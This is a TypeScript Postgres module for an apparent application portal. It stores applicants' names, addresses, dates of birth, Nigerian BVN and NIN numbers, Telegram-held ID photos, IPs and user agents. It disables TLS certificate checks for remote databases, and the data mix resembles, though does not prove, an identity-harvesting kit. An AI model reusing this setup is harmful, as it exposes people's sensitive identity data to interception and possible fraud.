import { Pool } from 'pg';

const url = process.env.DATABASE_URL!;
const local = url?.includes('localhost') || url?.includes('127.0.0.1');

const pool = new Pool({
  connectionString: url,
  max: 5,
  ssl: local ? undefined : { rejectUnauthorized: false },
});

const SCHEMA = `
  CREATE TABLE IF NOT EXISTS applications (
    id            bigserial PRIMARY KEY,
    ref           text UNIQUE NOT NULL,
    full_name     text NOT NULL,
    phone         text NOT NULL,
    dob           date NOT NULL,
    email         text NOT NULL,
    address       text NOT NULL,
    bvn           text NOT NULL,
    nin           text NOT NULL,
    id_type       text,
    photo_tg_id   text,
    id_tg_id      text,
    notified      boolean NOT NULL DEFAULT false,
    ip            text,
    user_agent    text,
    created_at    timestamptz NOT NULL DEFAULT now()
  );
  CREATE INDEX IF NOT EXISTS applications_created_idx ON applications (created_at DESC);
  CREATE INDEX IF NOT EXISTS applications_phone_idx ON applications (phone);
`;

let ready: Promise<void> | null = null;

export async function db() {
  if (!ready) ready = pool.query(SCHEMA).then(() => undefined);
  await ready;
  return pool;
}

export function makeRef() {
  const stamp = Date.now().toString(36).toUpperCase().slice(-6);
  const rand = Math.random().toString(36).toUpperCase().slice(2, 6);
  return `NERSI-${stamp}${rand}`;
}
